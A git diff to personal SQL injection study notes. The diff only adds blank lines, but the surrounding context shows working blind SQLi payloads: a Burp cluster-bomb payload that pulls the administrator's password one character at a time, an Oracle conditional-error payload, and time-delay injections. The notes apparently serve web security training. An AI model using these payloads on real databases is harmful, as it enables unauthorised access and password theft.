@@ -49,6 +49,9 @@ c. Out-of-band:
               3. Code review: Follow code path for input vectors.
               4. Tesst SQLi vulnerability.
 
+
+
+
 ********** ERROR BASED **********
 
 ***** STEP #1: Determine # of columns *****
@@ -140,7 +143,12 @@ c. Out-of-band:
 
 
 
+
+
+
 ********** BLIND SQL **********
+
+
 
 *** Blind SQLI with conditional responses ***
 
@@ -178,6 +186,9 @@ c. Out-of-band:
                 -> burp,(payload-type=bruteforcer): $a$. If 1st letter contains letter 'c' go to 2nd letter.
                 -> burp payload(cluster-bomb): ' and (select substring(password,$1$,1) from users where username='administrator' and LENGTH (password)>1) = '$a$'--' 
                 -> 1st type: number from 1 to 20. 2nd type: bruteforcer.
+
+
+
 
 ***** Blind SQLI with conditional errors *****
 
@@ -229,6 +240,9 @@ c. Out-of-band:
         Alternative payload:
         ' || (select TO_CHAR(1/0) FROM users WHERE username='administrator' and SUBSTR(password,1,1)='a')|| ' 
 
+
+
+
 ***** Blind SQLI with time delays *****
 
         Oracle       :  dbms_pipe.receive_message(('a'),10)
@@ -246,6 +260,9 @@ c. Out-of-band:
         ');waitfor delay '0:0:10'--
         ");waitfor delay '0:0:10'--
         ));waitfor delay '0:0:10'--
+
+
+
 
 ***** Blind SQLI with conditional time delays *****
 
